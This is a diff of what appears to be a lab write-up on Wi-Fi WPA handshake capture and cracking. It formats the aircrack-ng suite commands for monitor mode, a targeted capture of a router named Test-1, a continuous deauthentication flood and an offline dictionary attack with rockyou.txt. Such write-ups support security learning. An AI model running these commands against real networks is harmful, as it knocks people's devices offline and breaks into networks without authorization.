@@ -32,7 +32,7 @@ Scanned the system to identify the available wireless interfaces.
 
 bash
 
-iwconfig
+```iwconfig```
 Identified the primary wireless interface as wlan0.
 
 1.2 Process Interference Mitigation
@@ -40,13 +40,13 @@ Killed conflicting background processes (such as NetworkManager) to prevent them
 
 bash
 
-sudo airmon-ng check kill
+```sudo airmon-ng check kill```
 1.3 Enabling Monitor Mode
 Switched the wlan0 interface from Managed Mode to Monitor Mode, allowing it to listen to all wireless frames in the air, not just those directed to it.
 
 bash
 
-sudo airmon-ng start wlan0
+```sudo airmon-ng start wlan0```
 Interface was successfully renamed to wlan0mon.
 
 1.4 Verification
@@ -54,7 +54,7 @@ Confirmed that the interface was actively running in Monitor Mode.
 
 bash
 
-sudo airmon-ng
+```sudo airmon-ng```
 
 
 # Phase 2: Targeted Packet Capture
@@ -63,7 +63,7 @@ Scanned the surrounding airspace to identify access points, their channels, and 
 
 bash
 
-sudo airodump-ng wlan0mon
+```sudo airodump-ng wlan0mon```
 2.2 Target Identification
 From the scan results, located the target router Test-1. Opened a text file (text.txt) to securely log the following target variables:
 
@@ -75,7 +75,7 @@ Executed a targeted capture to save only the traffic specific to Test-1 on its s
 
 bash
 
-sudo airodump-ng -w datafile -c [channel_number] --bssid [Test-1_BSSID] wlan0mon
+```sudo airodump-ng -w datafile -c [channel_number] --bssid [Test-1_BSSID] wlan0mon```
 (Note: The terminal was left open to continuously listen for the handshake).
 
 
@@ -87,7 +87,7 @@ Opened a new terminal and broadcasted deauth frames to the target router.
 
 bash
 
-sudo aireplay-ng --deauth 0 -a [Test-1_BSSID] wlan0mon
+```sudo aireplay-ng --deauth 0 -a [Test-1_BSSID] wlan0mon```
 Command Breakdown:
 
 --deauth 0: The 0 signifies a continuous, unlimited stream of deauthentication packets. (If replaced with a number like 10, it would send exactly 10 packets and stop).
@@ -103,7 +103,7 @@ Before attempting to crack the password, the captured file was analyzed to verif
 
 bash
 
-wireshark datafile-01.cap
+```wireshark datafile-01.cap```
 Inside Wireshark, applied the display filter eapol to isolate the 4-way handshake frames (Messages 1-4), verifying that the ANonce, SNonce, and MICs were successfully captured.
 
 
@@ -112,7 +112,7 @@ With the handshake securely captured in datafile-01.cap, an offline dictionary a
 
 bash
 
-sudo aircrack-ng datafile-01.cap -w /usr/share/wordlists/rockyou.txt
+```sudo aircrack-ng datafile-01.cap -w /usr/share/wordlists/rockyou.txt```
 Results:
 
 The tool began computing the PBKDF2-SHA1 hashes and comparing the resulting MICs against the captured handshake.
